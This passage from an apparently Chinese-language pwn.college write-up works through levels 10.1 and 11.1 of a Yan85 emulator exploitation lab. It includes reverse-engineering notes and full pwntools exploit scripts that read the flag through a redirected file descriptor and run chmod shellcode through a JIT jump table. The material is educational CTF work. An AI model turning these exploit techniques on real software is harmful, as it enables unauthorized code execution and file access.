opcode[<span class="hljs-string">&#x27;sys&#x27;</span>])<br><span class="hljs-comment"># read_memory from stdin</span><br>yancode = pack(<span class="hljs-number">0x00</span>, reg[<span class="hljs-string">&#x27;a&#x27;</span>], opcode[<span class="hljs-string">&#x27;imm&#x27;</span>])<br>yancode += pack(<span class="hljs-number">0xff</span>, reg[<span class="hljs-string">&#x27;b&#x27;</span>], opcode[<span class="hljs-string">&#x27;imm&#x27;</span>])<br>yancode += pack(<span class="hljs-number">43</span>, reg[<span class="hljs-string">&#x27;c&#x27;</span>], opcode[<span class="hljs-string">&#x27;imm&#x27;</span>])<br>yancode += pack(reg[<span class="hljs-string">&#x27;a&#x27;</span>], sys_opcode[<span class="hljs-string">&#x27;read_memory&#x27;</span>], opcode[<span class="hljs-string">&#x27;sys&#x27;</span>])<br>p.send(yancode)<br><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>+yancode+shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h1 id="level-10-1"><a href="#level-10-1" class="headerlink" title="level 10.1"></a>level 10.1</h1><p><code>yancode</code>区和<code>memory</code>区恢复正常了，也就是现在能够溢出到返回地址。但是同样限制一个<code>sys</code>操作。(脑子轴了，就一直觉得简单，但是想好久)。一个sys可以同时执行<code>open</code>，<code>read_memory</code>和<code>write</code>。因为它们在<code>interpret_sys</code>中是按序出现的，且一个字节可以同时满足这三个系统调用的条件。<strong>那么这里的核心就是三者的返回值的关系了。</strong></p>
<p>首先<code>open</code>会返回<code>fd</code>。可以控制返回值存储的把它放在<code>reg_a</code>中，然后调用<code>read_memory</code>的时候会以<code>reg_a</code>为<code>fd</code>读取，读到<code>yan_memory</code>中后，返回值依然存储于<code>reg_a</code>中，这个返回值是<code>flag</code>的长度<code>+1</code>，因为结尾有<code>\n</code>。所以，在<code>write</code>的时候，<code>fd</code>是flag的长度，而不是<code>1</code>使其打印于终端。因此，我们需要绑定某个文件在固定的fd上，使得<code>write</code>输出到指定的文件中。</p>
<p>由于<code>process()</code>的特性（加上参数<code>close_fds=False</code>，rob课上讲过了），以及<code>exec 57&lt;&gt;a</code>能够绑定文件<code>a</code>的fd为<code>57</code>。</p>
<blockquote>
<p>pwntools的<code>process()</code>实际上是对python的<code>subprocess</code>的封装，也就是fork一个子进程执行目标程序。默认情况下，子进程的fd空间会继承父进程的fd空间，但由于<code>close_fds</code>的默认值为<code>True</code>，因此使用<code>process</code>时，子进程不会继承fd空间。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;info&quot;</span>,terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>])<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack</span>(<span class="hljs-params">a1, a2, a3</span>):<br>    <span class="hljs-comment"># 0x&#123;a1&#125;&#123;a2&#125;&#123;a3&#125;</span><br>    <span class="hljs-comment"># 由于顺序会变，三个参数的含义不同，所以pack仅做打包</span><br>    <span class="hljs-keyword">return</span> p8(a3) + p16((a1&lt;&lt;<span class="hljs-number">8</span>) + a2)           <span class="hljs-comment"># 注意小端序的pack方式</span><br><br><br><span class="hljs-comment"># p = gdb.debug(&quot;/tmp/toddlerone-level-10-0&quot;, &quot;b *$rebase(0x2071)&quot;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/toddlerone-level-10-1&quot;</span>, close_fds=<span class="hljs-literal">False</span>)<br><br>reg = &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-number">64</span>, <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">32</span>, <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-number">8</span>, <span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;i&#x27;</span>: <span class="hljs-number">4</span>, <span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-number">16</span>&#125;<br>opcode = &#123;<span class="hljs-string">&#x27;imm&#x27;</span>: <span class="hljs-number">0x01</span>, <span class="hljs-string">&#x27;add&#x27;</span>: <span class="hljs-number">0x40</span>, <span class="hljs-string">&#x27;stk&#x27;</span>: <span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;stm&#x27;</span>: <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;ldm&#x27;</span>: <span class="hljs-number">0x02</span>, <span class="hljs-string">&#x27;cmp&#x27;</span>: <span class="hljs-number">0x08</span>, <span class="hljs-string">&#x27;jmp&#x27;</span>: <span class="hljs-number">0x04</span>, <span class="hljs-string">&#x27;sys&#x27;</span>: <span class="hljs-number">0x80</span>&#125;<br>sys_opcode = &#123;<span class="hljs-string">&#x27;open&#x27;</span>: <span class="hljs-number">0x04</span>, <span class="hljs-string">&#x27;read_code&#x27;</span>: <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;read_memory&#x27;</span>: <span class="hljs-number">0x02</span>, <span class="hljs-string">&#x27;write&#x27;</span>: <span class="hljs-number">0x01</span>, <span class="hljs-string">&#x27;sleep&#x27;</span>: <span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;exit&#x27;</span>: <span class="hljs-number">0x08</span>&#125;<br><br><span class="hljs-comment"># open &amp; read &amp; write</span><br>yancode = pack(reg[<span class="hljs-string">&#x27;c&#x27;</span>], <span class="hljs-number">0x66</span>, opcode[<span class="hljs-string">&#x27;imm&#x27;</span>])<br>yancode += pack(reg[<span class="hljs-string">&#x27;d&#x27;</span>],reg[<span class="hljs-string">&#x27;c&#x27;</span>], opcode[<span class="hljs-string">&#x27;stm&#x27;</span>])<br>yancode += pack(reg[<span class="hljs-string">&#x27;b&#x27;</span>], <span class="hljs-number">0x00</span>, opcode[<span class="hljs-string">&#x27;imm&#x27;</span>])<br>yancode += pack(reg[<span class="hljs-string">&#x27;a&#x27;</span>], <span class="hljs-number">0x00</span>, opcode[<span class="hljs-string">&#x27;imm&#x27;</span>])<br>yancode += pack(sys_opcode[<span class="hljs-string">&#x27;open&#x27;</span>] | sys_opcode[<span class="hljs-string">&#x27;read_memory&#x27;</span>] | sys_opcode[<span class="hljs-string">&#x27;write&#x27;</span>], reg[<span class="hljs-string">&#x27;a&#x27;</span>], opcode[<span class="hljs-string">&#x27;sys&#x27;</span>])<br><span class="hljs-comment"># pause()</span><br>p.send(yancode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h1 id="level11-1"><a href="#level11-1" class="headerlink" title="level11.1"></a>level11.1</h1><p><code>yan85</code>变成了<code>yan85_64</code>，整体的<code>yancode</code>发生了变化。之前的类似一个三字节解释器，分割输入并以三字节为基准解释行为。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">addr = mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x1337000</span>, <span class="hljs-number">0x1000u</span>LL, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br></code></pre></td></tr></table></figure>

<p>在地址<code>0x1337000</code>处请求分配一页（4KB）匿名、权限为rwx的内存，且该映射是私有的（不与任何文件关联，且仅当前进程可见）。<code>addr</code>保存着映射内存区域的起始地址。</p>
<p>同理，有个<code>Loop</code>前的启动函数<code>emit_program(s)</code>，在进入指令解析前，有一个一个初始化：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">v11 = *(_QWORD *)(a1 + <span class="hljs-number">0x2000</span>);<br>v1 = helper_mov_imm(a1, v11, <span class="hljs-number">64LL</span>, <span class="hljs-number">0LL</span>);<br>v2 = helper_mov_imm(a1, v1, <span class="hljs-number">2LL</span>, <span class="hljs-number">0LL</span>);<br>v3 = helper_mov_imm(a1, v2, <span class="hljs-number">4LL</span>, <span class="hljs-number">0LL</span>);<br>v4 = helper_mov_imm(a1, v3, <span class="hljs-number">32LL</span>, <span class="hljs-number">0LL</span>);<br>v5 = helper_mov_imm(a1, v4, <span class="hljs-number">8LL</span>, <span class="hljs-number">0LL</span>);<br>v6 = helper_mov_imm(a1, v5, <span class="hljs-number">16LL</span>, <span class="hljs-number">0LL</span>);<br>v12 = (_BYTE *)helper_mov_imm(a1, v6, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>);<br></code></pre></td></tr></table></figure>

<p>看看<code>helper_mov_imm()</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">_QWORD *__fastcall <span class="hljs-title function_">helper_mov_imm</span><span class="hljs-params">(__int64 a1, _BYTE *a2, __int64 a3, __int64 a4)</span><br>&#123;<br>  _QWORD *v5; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-keyword">switch</span> ( a3 )<br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">64LL</span>:<br>      *a2 = <span class="hljs-number">73</span>;<br>      a2[<span class="hljs-number">1</span>] = <span class="hljs-number">-70</span>;<br>      v5 = a2 + <span class="hljs-number">2</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2LL</span>:<br>          ...<br>    <span class="hljs-keyword">default</span>:<br>      crash(a1, <span class="hljs-string">&quot;Unknown register in emit_imm&quot;</span>);<br>  &#125;<br>  *v5 = a4;<br>  <span class="hljs-keyword">return</span> v5 + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>还是gdb吧，简单而直接。简单调试就能够<strong>发现<code>v11</code>指向的是<code>addr</code>。</strong> 即<code>s[0x2000]</code>保存着<code>addr</code>，也就是<code>mmap</code>申请内存的起始地址。经过<code>v1 = helper_mov_imm(a1, v11, 64LL, 0LL);</code>后，映射内存的状态：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/x <span class="hljs-number">0</span>x1337000<br><span class="hljs-attribute">0x1337000</span>:      <span class="hljs-number">0</span>x0000ba49<br><span class="hljs-attribute">pwndbg</span>&gt; tele <span class="hljs-number">0</span>x1337000<br><span class="hljs-attribute">00</span>:<span class="hljs-number">0000</span>│  <span class="hljs-number">0</span>x1337000 ◂— movabs r10, <span class="hljs-number">0</span> /* <span class="hljs-number">0</span>xba49 */<br><span class="hljs-attribute">01</span>:<span class="hljs-number">0008</span>│  <span class="hljs-number">0</span>x1337008 ◂— <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<p>执行初始化后的映射内存状态：</p>
<img src="/2025/05/11/pwn-college-Program-Exploitation/image-20250510165156844.png" srcset="/img/loading.gif" lazyload class="" title="image-20250510165156844">

<p>根据最后JIT的结果，发现寄存器<code>abcdsf i</code>会被一一对应于<code>r10/r11/r12/r13/r14/r15 /r9</code>寄存器。<strong>是因为机器指令的对应关系。</strong></p>
<img src="/2025/05/11/pwn-college-Program-Exploitation/image-20250510203051677.png" srcset="/img/loading.gif" lazyload  alt="image-20250510203051677" style="zoom: 67%;" />

<p>进入循环时，v12指向了<code>0x1337046</code>。先执行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">*(_QWORD *)(a1 + <span class="hljs-number">8</span> * (i + <span class="hljs-number">1024LL</span>) + <span class="hljs-number">8</span>) = &amp;v12[-*(_QWORD *)(a1 + <span class="hljs-number">0x2000</span>)];<br></code></pre></td></tr></table></figure>

<p><code>s+0x2000</code>保存着<code>0x1337000</code>，也就是映射内存的起始地址。这里将当前<code>v12</code>基于<code>0x137000</code>的偏移地址存入<code>s+0x2008</code>中，并且每一次循环都依次存入后续位置。紧接着执行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">*v12 = <span class="hljs-number">73</span>;<br>v13 = v12 + <span class="hljs-number">1</span>;<br>*v13++ = <span class="hljs-number">-57</span>;<br>*v13++ = <span class="hljs-number">-63</span>;<br></code></pre></td></tr></table></figure>

<p>也是写入一个指令：<img src="/2025/05/11/pwn-college-Program-Exploitation/image-20250510174719065.png" srcset="/img/loading.gif" lazyload class="" title="image-20250510174719065"></p>
<p>同样看一下JIT的结果：</p>
<img src="/2025/05/11/pwn-college-Program-Exploitation/image-20250510203642334.png" srcset="/img/loading.gif" lazyload  alt="image-20250510203642334" style="zoom:50%;" />

<p>机器指令对应的汇编为<code>mov r9, 0</code>。</p>
<p>然后看调用<code>yan85_64</code>解释器的参数构成：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">v12 = (_BYTE *)emit_instruction(<br>    a1,<br>    (<span class="hljs-type">int</span>)v13 + <span class="hljs-number">4</span>,<br>    i,<br>    a1,<br>    v7,<br>    v8,<br>    *(_QWORD *)(a1 + <span class="hljs-number">24LL</span> * i),<br>    *(_QWORD *)(a1 + <span class="hljs-number">24LL</span> * i + <span class="hljs-number">8</span>),<br>    *(_QWORD *)(a1 + <span class="hljs-number">24LL</span> * i + <span class="hljs-number">16</span>));<br></code></pre></td></tr></table></figure>

<p>最后三个参数是用户输入的<code>yancode</code>，三个8字节数据（此前<code>yan85</code>是三个1字节数据）。</p>
<img src="/2025/05/11/pwn-college-Program-Exploitation/image-20250510175736371.png" srcset="/img/loading.gif" lazyload class="" title="image-20250510175736371">

<p>查看<code>emit_instruction()</code>中是按照哪个参数进行解析的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( (a9 &amp; <span class="hljs-number">4</span>) != <span class="hljs-number">0</span> )<br>    v10 = (_BYTE *)emit_imm(a1, (_DWORD)a2, (_DWORD)a2, a4, a5, a6, a7, a8);<br></code></pre></td></tr></table></figure>

<p>opcode是<code>a9</code>，也就是每第三个8字节数据。具体的函数就不逐一分析了。做个汇总：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># imm</span><br><span class="hljs-comment"># usage: &#123;reg_x&#125;&#123;value&#125;&#123;opcode&#125;</span><br><span class="hljs-comment"># list [a: -70(0xba), b: -69(0xbb), c: -68(0xbc), d: -67(0xbd), s: -66(0xbe), i: -71(0xb9), f:-65(0xbf)]</span><br><span class="hljs-comment"># 0x1337xxx: 0x&#123;value&#125;&#123;reg_x:0xb9~0xbf&#125;&#123;73&#125;		=&gt; 机器指令</span><br><span class="hljs-comment"># mov reg_x, value</span><br><br><span class="hljs-comment"># add</span><br><span class="hljs-comment"># usage: &#123;reg_x&#125;&#123;reg_y&#125;&#123;opcode&#125;</span><br><span class="hljs-comment"># add reg_x, reg_y</span><br><br><span class="hljs-comment"># stk</span><br><span class="hljs-comment"># push usgae: &#123;00&#125;&#123;reg_x&#125;&#123;opcode&#125;</span><br><span class="hljs-comment"># push reg_x</span><br><span class="hljs-comment"># pop usage: &#123;reg_x&#125;&#123;00&#125;&#123;opcode&#125;</span><br><span class="hljs-comment"># pop reg_x</span><br><br><span class="hljs-comment"># stm</span><br><span class="hljs-comment"># usage: &#123;reg_x&#125;&#123;reg_y&#125;&#123;opcode&#125;</span><br><span class="hljs-comment"># mov [memory+reg_x], reg_y</span><br><br><span class="hljs-comment"># ldm</span><br><span class="hljs-comment"># usage: &#123;reg_x&#125;&#123;reg_y&#125;&#123;opcode&#125;</span><br><span class="hljs-comment"># mov reg_x, [memory+reg_y]</span><br><br><span class="hljs-comment"># jmp</span><br><span class="hljs-comment"># usage: &#123;00&#125;&#123;stack_addr + reg_x&#125;&#123;opcode&#125;</span><br></code></pre></td></tr></table></figure>

<p>最后有一个关键：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))addr)();<br></code></pre></td></tr></table></figure>

<p>**这行代码会跳转到地址<code>0x1337000</code>并开始执行那里的机器码。**也就是说，我们通过<code>yancode</code>操作并生成<code>0x137000</code>处的机器码，并且最后会执行这些机器码。</p>
<blockquote>
<p>关于<code>Yan85_64</code>说明：</p>
<p>它拥有自己的架构，包含各种数据段。它的核心是根据<code>yancode</code>操纵mmap生成的内存映射段<code>0x1337000~0x1338000</code>。其模拟寄存器<code>abcdsif</code>对应真实程序寄存器<code>r10,r11,r12,r13,r14,r9,r15</code>。</p>
<p><strong>同<code>Yan85</code>类似，它的指令拥有着自己的数据段。我们能操纵的只有偏移地址！</strong></p>
<p><code>imm</code>指令中，将立即数存入模拟寄存器中。<code>stk</code>指令中，用一段栈空间模拟出一个Yan85栈区。</p>
<p><code>stm</code>指令中，将某个寄存器的值，存入到Yan85数据区，可以用一个寄存器来控制偏移。</p>
<p><code>jmp</code>指令中，模拟<code>RIP</code>寄存器，在<code>JMP</code>指令偏移区中存储着<code>0x1337000</code>段机器指令的偏移地址。但我们给予<code>jmp</code>指令的参数是一个寄存器，这个寄存器的值是<code>JMP</code>指令偏移区的索引。例如，要跳转到<code>0x1337000</code>段的第一条指令，则给jmp指令的寄存器中的值为0，第二条指令则为1，以此类推…</p>
<p>关于<code>Yan85_64</code>的拥有的段：<code>yancode</code>段，<code>stack</code>段，<code>data</code>段，<code>jmp</code>偏移段。<strong>这几个段的偏移地址是不变的。<strong>因此段与段之间的距离是</strong>固定的</strong>。</p>
</blockquote>
<p>通过gdb能够轻易得出<code>data</code>段和<code>jmp</code>偏移段的距离<code>0x808</code>。我们能够操纵<code>8</code>字节数据作为偏移量，因此可以轻易使用<code>stm</code>指令在<code>stack/data/jmp</code>段内写入任意数据。但遗憾的是，本题程序的<code>stack</code>不可执行。</p>
<p>可以将shellcode分段存储于<code>0x1337000</code>内，然后通过<code>stm</code>指令控制<code>jmp</code>段，再通过<code>jmp</code>指令跳转到<code>0x1337000</code>段内构造的部分<code>shellcode</code>，每部分<code>shellcode</code>执行结束后都有一个<code>jmp</code>指令连接下一部分<code>shellcode</code>。<strong>以间接的形式执行shellcode。</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;info&quot;</span>,terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>])<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack</span>(<span class="hljs-params">a7, a8, a9</span>):<br>    <span class="hljs-comment"># memory:</span><br>    <span class="hljs-comment"># &#123;a7&#125;  </span><br>    <span class="hljs-comment"># &#123;a8&#125;  </span><br>    <span class="hljs-comment"># &#123;a9&#125;  </span><br>    <span class="hljs-keyword">return</span> p64(a7) + p64(a8) + p64(a9)<br><br><span class="hljs-comment"># p = gdb.debug(&quot;/tmp/toddlerone-level-11-1&quot;, &quot;b *$rebase(0x2ad0)&quot;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/toddlerone-level-11-1&quot;</span>, close_fds=<span class="hljs-literal">False</span>)<br><br>reg = &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">16</span>, <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-number">32</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-number">8</span>, <span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;i&#x27;</span>: <span class="hljs-number">64</span>, <span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-number">4</span>&#125;<br>opcode = &#123;<span class="hljs-string">&#x27;imm&#x27;</span>: <span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;add&#x27;</span>: <span class="hljs-number">0x02</span>, <span class="hljs-string">&#x27;stk&#x27;</span>: <span class="hljs-number">0x01</span>, <span class="hljs-string">&#x27;stm&#x27;</span>: <span class="hljs-number">0x40</span>, <span class="hljs-string">&#x27;ldm&#x27;</span>: <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;cmp&#x27;</span>: <span class="hljs-number">0x04</span>, <span class="hljs-string">&#x27;jmp&#x27;</span>: <span class="hljs-number">0x08</span>, <span class="hljs-string">&#x27;sys&#x27;</span>: <span class="hljs-number">0x80</span>&#125;<br><br><span class="hljs-comment"># shellcode</span><br>shellcode = asm(shellcraft.chmod(<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-number">0o777</span>))   <span class="hljs-comment"># len: 16</span><br>shellcode = [shellcode[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>], shellcode[<span class="hljs-number">5</span>:<span class="hljs-number">11</span>], shellcode[<span class="hljs-number">11</span>:]]<br><br><br>stm_to_jmp_offset = <span class="hljs-number">0x808</span><br>shellcode_offset = [<span class="hljs-number">0x139</span>+<span class="hljs-number">5</span>, <span class="hljs-number">0x182</span>+<span class="hljs-number">4</span>, <span class="hljs-number">0x1cb</span>+<span class="hljs-number">5</span>]<br>offset = <span class="hljs-number">0x900</span><br>yancode = <span class="hljs-string">b&#x27;&#x27;</span><br><br><span class="hljs-comment"># overwrite STM seg</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(shellcode_offset)):<br>    offset += <span class="hljs-number">8</span><br>    yancode += pack(reg[<span class="hljs-string">&#x27;a&#x27;</span>], offset, opcode[<span class="hljs-string">&#x27;imm&#x27;</span>])<br>    yancode += pack(reg[<span class="hljs-string">&#x27;b&#x27;</span>], shellcode_offset[i], opcode[<span class="hljs-string">&#x27;imm&#x27;</span>])<br>    yancode += pack(reg[<span class="hljs-string">&#x27;a&#x27;</span>], reg[<span class="hljs-string">&#x27;b&#x27;</span>], opcode[<span class="hljs-string">&#x27;stm&#x27;</span>])<br><br><span class="hljs-comment"># overwrite JMP&#x27;index seg</span><br>shellcode_offset_index = <span class="hljs-number">32</span><br>yancode += pack(reg[<span class="hljs-string">&#x27;i&#x27;</span>], shellcode_offset_index, opcode[<span class="hljs-string">&#x27;imm&#x27;</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(shellcode)):<br>    yancode += pack(reg[<span class="hljs-string">&#x27;a&#x27;</span>], u64(shellcode[i].rjust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)), opcode[<span class="hljs-string">&#x27;imm&#x27;</span>])<br>    shellcode_offset_index += <span class="hljs-number">1</span><br>    yancode += pack(reg[<span class="hljs-string">&#x27;i&#x27;</span>], shellcode_offset_index, opcode[<span class="hljs-string">&#x27;imm&#x27;</span>])<br><br>p.send(yancode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Pwn/" class="category-chain-item">Pwn</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>pwn.college: Program Exploitation</div>
      <div>https://loboq1ng.github.io/2025/05/11/pwn-college-Program-Exploitation/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Lobo Q1ng</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年5月11日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/04/21/pwn-college-Dynamic-Allocator-Misuse/" title="pwn.college: Dynamic Allocator Misuse">
                        <span class="hidden-mobile">pwn.college: Dynamic Allocator Misuse</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
